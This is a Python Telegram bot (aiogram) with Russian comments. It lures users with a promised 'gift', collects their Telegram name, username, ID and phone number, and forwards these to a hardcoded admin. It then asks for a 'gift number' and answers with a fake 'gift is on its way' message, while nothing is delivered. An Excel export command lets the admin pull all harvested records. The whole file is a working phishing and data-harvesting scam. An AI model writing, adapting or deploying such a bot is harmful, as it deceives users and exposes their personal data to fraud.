import asyncio
import sqlite3
from openpyxl import Workbook

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message,
    ReplyKeyboardMarkup,
    KeyboardButton,
    FSInputFile,
    WebAppInfo,
    ReplyKeyboardRemove
)
from aiogram.enums import ParseMode, ContentType
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.storage.memory import MemoryStorage

# ================== КОНФИГ ==================
# ВАЖНО: Вставь сюда новый токен!
TOKEN = "ТВОЙ_НОВЫЙ_ТОКЕН" 
ADMIN_IDS = [422118750]
GEMS = 1
# Сюда нужно вставить ссылку на твой сайт, куда ты загрузишь index.html
WEBAPP_URL = "https://твой-сайт.com/index.html" 
# ===========================================

# ================== БАЗА ==================
conn = sqlite3.connect("database.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    name TEXT,
    phone TEXT
)
""")
conn.commit()

# ================== БОТ ==================
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# ================== /start ==================
@router.message(F.text == "/start")
async def start_handler(message: Message):
    cursor.execute("SELECT id FROM users WHERE id = ?", (message.from_user.id,))
    exists = cursor.fetchone()

    # Получаем юзернейм (если он скрыт или его нет, будет "Скрыт")
    username = f"@{message.from_user.username}" if message.from_user.username else "Скрыт"

    if not exists:
        cursor.execute(
            "INSERT INTO users (id, name) VALUES (?, ?)",
            (message.from_user.id, message.from_user.first_name)
        )
        conn.commit()

        for admin in ADMIN_IDS:
            await bot.send_message(
                admin,
                f"🆕 Новый пользователь!\n\n"
                f"👤 Имя: {message.from_user.first_name}\n"
                f"🆔 ID: <code>{message.from_user.id}</code>\n"
                f"🐕 Username: {username}"
            )

    # Клавиатура с кнопкой Web App
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(
                text="🎁 Получить подарок 🎁",
                web_app=WebAppInfo(url=WEBAPP_URL)
            )]
        ],
        resize_keyboard=True
    )

    await message.answer(
        f"Привет, {message.from_user.first_name}! 🤗\n"
        f"Чтобы получить {GEMS} подарок — нажми кнопку ниже.",
        reply_markup=kb
    )

# ================== КОНТАКТ ==================
@router.message(F.content_type == ContentType.CONTACT)
async def contact_handler(message: Message):
    # Защита: проверяем, что юзер скинул именно свой контакт
    if message.contact.user_id != message.from_user.id:
        await message.answer("Пожалуйста, отправьте именно свой контакт.")
        return

    # Получаем юзернейм из объекта from_user
    username = f"@{message.from_user.username}" if message.from_user.username else "Скрыт"

    cursor.execute(
        "UPDATE users SET phone = ? WHERE id = ?",
        (message.contact.phone_number, message.from_user.id)
    )
    conn.commit()

    # Отправляем админу полную инфу: Имя, Ник, ID, Телефон
    for admin in ADMIN_IDS:
        await bot.send_message(
            admin,
            f"📱 Пользователь отправил контакт\n\n"
            f"👤 Имя: {message.from_user.first_name}\n"
            f"🐕 Username: {username}\n"
            f"🆔 ID: <code>{message.from_user.id}</code>\n"
            f"☎ Телефон: +{message.contact.phone_number}"
        )

    # Убираем кнопку Web App и просим ввести тег
    await message.answer(
        "Контакт успешно получен! ✅\n⌨ Введи номер подарка (с #)",
        reply_markup=ReplyKeyboardRemove()
    )

# ================== ТЕГ ==================
@router.message(F.text.startswith("#"))
async def tag_handler(message: Message):
    await message.answer(f"Отправляю {GEMS} подарок...")
    await asyncio.sleep(3)
    await message.answer("Подарок появится через пару минут.")

# ================== ЭКСПОРТ В EXCEL ==================
@router.message(F.text == "/export")
async def export_excel(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return

    cursor.execute("SELECT * FROM users")
    rows = cursor.fetchall()

    if not rows:
        await message.answer("База пустая.")
        return

    wb = Workbook()
    ws = wb.active
    ws.title = "Users"
    ws.append(["ID", "Name", "Phone"])

    for row in rows:
        ws.append(row)

    file_path = "users_export.xlsx"
    wb.save(file_path)

    await message.answer_document(FSInputFile(file_path))

# ================== ЗАПУСК ==================
async def main():
    print("🤖 Бот запущен. Нажми Ctrl+C для остановки.")
    try:
        await dp.start_polling(bot)
    except asyncio.CancelledError:
        print("⛔ Задачи отменены")
    finally:
        await bot.session.close()
        conn.close()
        print("👋 Бот корректно остановлен")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ Остановлено пользователем")
